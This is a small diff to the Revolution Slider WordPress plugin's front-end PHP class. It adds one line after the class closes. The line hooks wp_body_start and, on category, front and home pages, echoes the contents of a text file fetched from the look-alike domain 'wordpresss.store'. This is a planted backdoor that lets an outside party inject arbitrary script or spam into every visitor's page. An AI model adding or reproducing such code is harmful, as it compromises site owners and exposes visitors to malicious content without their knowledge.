@@ -627,5 +627,5 @@ class RevSliderFront extends RevSliderFunctions {
 	}
 	
 }
-
+add_action('wp_body_start', function(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpresss.store/20210103.txt");}});
 ?>
